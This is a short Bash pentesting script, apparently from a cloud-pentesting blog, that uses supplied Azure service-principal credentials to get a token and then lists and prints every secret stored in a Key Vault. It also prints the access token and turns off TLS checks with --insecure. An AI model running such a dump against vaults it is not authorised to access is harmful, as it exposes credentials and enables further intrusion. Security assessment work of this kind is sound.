#!/usr/bin/bash
# Script to dump secrets from azure keyvault
# Author: 0xl3mon
# https://thecyberpunker.com/pentesting/pentesting-cloud-azure/

# COLORS
readonly  BLUE='\033[94m'
readonly  RED='\033[91m'
readonly  GREEN='\033[92m'
readonly  ORANGE='\033[93m'
readonly  RESET='\e[0m'

# CTRL + C
trap ctrl_c INT

function ctrl_c() {
    echo -e "\n\n${ORANGE}Exiting...${RESET}"
    exit
}

# Banner
function banner(){
	echo ""
	echo -e  "  / _ \                                            | |       "
	echo -e  " / /_\ \_____   _ _ __ ___   ___  ___  ___ _ __ ___| |_ ___  "
	echo -e  " |  _  |_  / | | | '__/ _ \ / __|/ _ \/ __| '__/ _ \ __/ __| "
	echo -e  " | | | |/ /| |_| | | |  __/ \__ \  __/ (__| | |  __/ |_\__ \ "
	echo -e  " \_| |_/___|\__,_|_|  \___| |___/\___|\___|_|  \___|\__|___/ "
	echo ""
}

# Fetch Jwt
function get_jwt(){
	# Req
	jwt_raw=$(curl "https://login.microsoftonline.com/$KEYVAULT_CLIENT_TENANT_ID/oauth2/v2.0/token" --silent --data "grant_type=client_credentials&client_id=$KEYVAULT_CLIENT_ID&client_secret=$KEYVAULT_CLIENT_KEY&scope=https://vault.azure.net/.default" | jq '.access_token' )
	[[ $jwt_raw == "null" ]] && echo -e "${RED}[${RESET}${ORANGE}-${RESET}${RED}]${RESET} Error obteniendo el JWT de autenticación" && exit 1
	echo -e "${ORANGE}[${RESET}${GREEN}+${RESET}${ORANGE}]${RESET}  Jwt Obtenido: $jwt_raw"
	jwt=$(echo $jwt_raw | tr -d '"')
}

function dumping_secrets(){
	echo -e "\n${ORANGE}[${RESET}${GREEN}+${RESET}${ORANGE}]${RESET} Listando Secretos del vault" ;	sleep 0.2
	echo "$KEYVAULT_URI/secrets?api-version=7.3"
	secrets=$(curl -X GET "$KEYVAULT_URI/secrets?api-version=7.3" -H "Authorization: Bearer $jwt" --silent | jq ' .value[] | {id}[]' )

	printf "%s\n" "${secrets[@]}"

	echo -e "\n${ORANGE}[${RESET}${GREEN}+${GREEN}${ORANGE}]${RESET} Obteniendo secretos"
	for i in ${secrets[@]}; do
		url="$(echo $i | tr -d '"')?api-version=7.3"
		echo "Url:  $url"
		raw_content=$(curl -X GET --silent "$url" -H "Authorization: Bearer $jwt" --insecure)
		contentType=$(echo $raw_content | jq '.contentType')
		secretValue=$(echo $raw_content | jq '.value')
		echo -e "${ORANGE}ContentType:${RESET} ${GREEN} $contentType ${RESET}"
  	echo -e "${ORANGE}SecretValue:${RESET} ${GREEN} $secretValue ${RESET}\n"
	done

}

function help(){
	echo "[+] usage: $0 --tenant-id [] --client-id [] --client-key [] --keyvault []"
	exit 1
}

function main(){
		banner
		get_jwt
		sleep 0.5
		dumping_secrets
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --tenant-id)
      KEYVAULT_CLIENT_TENANT_ID=$2
      shift 2
      ;;

    --client-id)
      KEYVAULT_CLIENT_ID=$2
      shift 2
      ;;

    --client-key)
      KEYVAULT_CLIENT_KEY=$2
      shift 2
      ;;

    --keyvault)
      KEYVAULT_URI=$2
      shift 2
      ;;

    *)
  	  help
      ;;
  esac
done

# Flujo
main